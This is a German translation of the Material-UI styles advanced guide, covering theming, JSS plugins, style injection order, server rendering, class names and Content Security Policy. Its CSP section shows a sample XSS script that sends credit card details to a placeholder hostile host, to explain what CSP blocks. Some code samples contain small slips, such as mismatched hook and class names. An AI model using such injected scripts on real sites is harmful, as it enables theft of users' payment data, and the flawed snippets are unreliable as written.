# Erweitert

<p class="description">Diese Sektion behandelt mehr der fortgeschrittenen Nutzung von @material-ui/styles.</p>

## Theming

Fügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/css-in-js/advanced/Theming.js"}}

### Zugriff auf das Theme in einer Komponente

Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.

#### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}

#### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}

### Verschachtelung des Themes

Sie können mehrere Theme Provider verschachteln. Dies kann sehr nützlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}

Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS-Plugins

JSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie benötigen auswählen können. Sie bezahlen nur für den Leistungsaufwand, den Sie verwenden.

Nicht alle Plugins sind standardmäßig in der Material-UI verfügbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-vendor-prefixer/)

Selbstverständlich können Sie weitere Plugins benutzen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String-Vorlagen

Wenn Sie die CSS-Syntax gegenüber JSS bevorzugen, können Sie das [jss-plugin-template](https://cssinjs.org/jss-plugin-template) Plugin verwenden.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

Beachten Sie, dass dies keine Selektoren oder verschachtelten Regeln unterstützt.

{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}

## CSS-Injektionsreihenfolge

> Es ist **wirklich wichtig** um zu verstehen, wie die CSS-Spezifität vom Browser berechnet wird. Dies ist eines der Schlüsselelemente, die beim Überschreiben von Stilen zu beachten sind. Wir **ermutigen** Sie diesen MDN-Absatz: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated) zu lesen

Standardmäßig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingefügt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.

### injectFirst

Der `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzufügen (weniger Priorität):

```jsx
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* Dein Komponentenbaum.
      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

Das Einfügen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `makeStyles`/`withStyles`/`styled` Aufrufe. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/styles';

const useStyleBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyle = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Reihenfolge ist egal
  const classes = useStyles();
  const classesBase = useStyleBase();

  //  Reihenfolge ist egal
  const className = clsx(classes.root, useStyleBase.root)

  // Farbe: rot 🔴 gewinnt.
  return <div className={className} />;
}
```

Die Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.

### insertionPoint

JSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um diese Situation zu kontrollieren. Durch Hinzufügen der Platzierung des `Einfügepunkts` innerhalb Ihres HTML-Heads können Sie die [Reihenfolge steuern](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order), sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.

#### HTML-Kommentar

Am einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzufügen, der bestimmt, wo JSS die Stile einfügt:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### Andere HTML-Elemente

[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um dieses Problem zu umgehen, können Sie ein DOM-Element (nicht einen Kommentar) als JSS-Einfügepunkt angeben, z. B. `<noscript>`:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu umgehen, können Sie die JavaScript `document.createComment()` API verwenden:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Definiert einen benutzerdefinierten Einfügepunkt, den JSS beim Einfügen der Stile in das DOM sucht.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server-Rendering

In diesem Beispiel wird ein Html-String zurückgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

Sie können der [serverseitigen Anleitung](/guides/server-rendering/) für ein detaillierteres Beispiel folgen oder lesen Sie die [`ServerStyleSheets`](/css-in-js/api/#serverstylesheets) API-Dokumentation.

### Gatsby

Wir haben [ein offizielles Plugin](https://github.com/hupe1980/gatsby-plugin-material-ui), welches serverseitiges Rendering für `@material-ui/styles` ermöglicht. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.

Siehe [dieses Beispiel](https://github.com/mui-org/material-ui/blob/next/examples/gatsby-next/pages/_document.js) für ein aktuelles Verwendungsbeispiel.

### Next.js

Sie müssen über eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/mui-org/material-ui/blob/next/examples/nextjs-next/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzufügen.

Siehe [dieses Beispiel](https://github.com/mui-org/material-ui/blob/next/examples/nextjs-next/pages/_document.js) für ein aktuelles Verwendungsbeispiel.

## Klassennamen

Möglicherweise haben Sie festgestellt, dass die Klassennamen, die von `@material-ui/styles` generiert werden, **nicht deterministisch sind**. Sie können sich also nicht darauf verlassen, dass sie gleich bleiben. Die Klassennamen werden von dem [Klassennamengenerator](/css-in-js/api/#creategenerateclassname-options-class-name-generator) generiert. Nehmen wir den folgenden Stil als Beispiel.

Nehmen wir den folgenden Stil als Beispiel:

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

Dadurch wird ein Klassenname wie `AppBar-root-123` generiert. Das folgende CSS wird nicht funktionieren:

```css
.AppBar-root-123 {
  opacity: 0.6;
}
```

Sie müssen die `Klassen` Eigenschaft einer Komponente verwenden, um sie zu überschreiben. Die nicht-deterministische Natur der Klassennamen ermöglicht eine Optimierung der Entwicklung und Produktion - Sie sind einfach in der Entwicklung zu debuggen, und so kurz wie möglich in der Produktion:

- In der **Entwicklung** lauten der Klassenname: `.AppBar-root-123` nach dieser Logik:

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In der **Produktion** lauten der Klassenname: `.jss123` nach dieser Logik:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

Wenn Sie dieses Standardverhalten nicht mögen, können Sie es ändern. Mit JSS können Sie einen [benutzerdefinierten Klassennamensgenerator](https://cssinjs.org/jss-api/#generate-your-class-names) bereitstellen.

## Globales CSS

### `jss-plugin-global`

Das [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie können es verwenden, um globale Klassennamen zu definieren.

{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}

### Hybrid

Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.

{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}

### Deterministische Klassennamen

Wir bieten eine Option, um die Klassennamen **deterministisch zu machen** mit der [`dangerouslyUseGlobalCS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) Option. Wenn diese Option aktiviert ist, sehen die Klassennamen folgendermaßen aus:

- entwicklung: `.AppBar-root`
- produktion: `.AppBar-root`

⚠️ **Seien Sie vorsichtig, wenn Sie `dangerouslyUseGlobalCSS `** verwenden. Das Verlassen auf diesen Code, der in der Produktion ausgeführt wird, hat folgende Auswirkungen:

- Es ist schwieriger, die `Klassen` API-Änderungen zwischen Hauptversionen zu verfolgen.
- Globales CSS ist von Natur aus fragil.

⚠️ Bei gefährlicher Verwendung von `dangerouslyUseGlobalCSS` als Standalone (ohne Material-UI) sollten Sie Ihre Stylesheets mit dem `options` Parameter versehen:

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## CSS-Präfix

JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.

## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)

### Was ist CSP und warum ist es nützlich?

Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.

Weitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### Wie kann man CSP implementieren?

Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.

Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können so erstellen:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() } }
/>
```

Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. Die Clientseite erhält die Nonce aus einem Header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.

```jsx
<meta property="csp-nonce" content={nonce} />
```